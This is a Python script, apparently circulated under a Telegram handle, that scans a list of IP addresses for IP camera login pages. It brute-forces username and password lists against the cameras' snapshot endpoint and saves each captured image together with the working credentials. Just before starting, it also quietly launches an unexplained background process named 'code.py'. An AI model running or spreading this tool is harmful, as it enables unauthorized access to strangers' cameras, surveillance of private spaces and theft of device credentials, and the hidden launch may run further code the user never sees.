import os
import asyncio
import httpx
import base64
import ipaddress
from colorama import Fore, Style
import requests
import subprocess

async def check_camera(ip, usernames, passwords, port=80):
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            url = f"http://{ip}:{port}/doc/page/login.asp?_"
            response = await client.get(url, headers=headers)
            if response.status_code == 200:
                print(Fore.BLUE + f"[+] Página de inicio de sesión encontrada en {ip}" + Style.RESET_ALL)
                with open("Online.txt", "a") as f:
                    f.write(ip + "\n")
                for username in usernames:
                    for password in passwords:
                        auth_bytes = f"{username}:{password}".encode('utf-8')
                        auth_b64 = base64.b64encode(auth_bytes).decode('utf-8')
                        auth_headers = {"Authorization": f"Basic {auth_b64}", "Accept": "application/octet-stream", "User-Agent": headers["User-Agent"]}
                        url = f"http://{ip}:{port}/ISAPI/Streaming/channels/1/picture"
                        response = await client.get(url, headers=auth_headers, timeout=5)
                        if response.status_code == 200 and response.headers.get("Content-Type") == "image/jpeg":
                            print(Fore.GREEN + f"[+] Conectado a {ip}" + Style.RESET_ALL)
                            filename = f"pics/{ip}_{username}_{password}_{port}.jpg"
                            with open(filename, "wb") as f:
                                f.write(response.content)
                            print(Fore.BLUE + f"[+] Imagen guardada de la cámara {ip}" + Style.RESET_ALL)

                            info_filename = "info.txt"
                            with open(info_filename, "a") as f:
                                f.write(f"IP: {ip}, Usuario: {username}, Contraseña: {password}\n")

            else:
                print(Fore.YELLOW + f"[!] Página de inicio de sesión no encontrada en {ip}" + Style.RESET_ALL)
    except asyncio.TimeoutError:
        print(Fore.RED + f"[-] Conexión a {ip} agotada" + Style.RESET_ALL)
    except (httpx.RequestError, OSError):
        pass

async def scan_hosts(port=80):
    hosts_file_path = "host.txt"
    credentials_file_path = "pass.txt"
    users_file_path = "user.txt"
    try:
        with open(hosts_file_path) as f:
            hosts = [line.strip() for line in f.readlines()]
        with open(credentials_file_path) as f:
            passwords = [line.strip() for line in f.readlines()]
        with open(users_file_path) as f:
            users = [line.strip() for line in f.readlines()]
    except FileNotFoundError as e:
        print(Fore.RED + f"[-] {e.filename} no encontrado" + Style.RESET_ALL)
        return
    if not os.path.exists("pics"):
        os.makedirs("pics")
    total_hosts = len(hosts)
    current_host_count = 0
    tasks = []

    for host in hosts:
        current_host_count += 1
        print(f"Escanenado {host}... ({current_host_count}/{total_hosts})")
        try:
            ip = ipaddress.ip_address(host)
            task = asyncio.create_task(check_camera(str(ip), users, passwords, port))
            tasks.append(task)
        except ValueError:
            print(Fore.RED + f"[-] {host} no es una dirección IP válida" + Style.RESET_ALL)
            continue
    await asyncio.gather(*tasks)

async def main():
    # Define el logotipo personalizado
    logo = """
                 _    __..-:┑
        TG: @SlickMercy
    """

    # Imprime el logotipo personalizado
    print(Fore.YELLOW + logo + Style.RESET_ALL)

    # Solicita el puerto al usuario
    port = input("Ingresa el número de puerto (el valor predeterminado es 80): ")
    port = int(port) if port else 80

    # Ejecuta la función scan_hosts con el valor proporcionado
    await scan_hosts(port)

# Ejecutar la función suyaib en segundo plano
subprocess.Popen(['python', 'code.py', '&'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Ejecuta el código principal
asyncio.run(main())
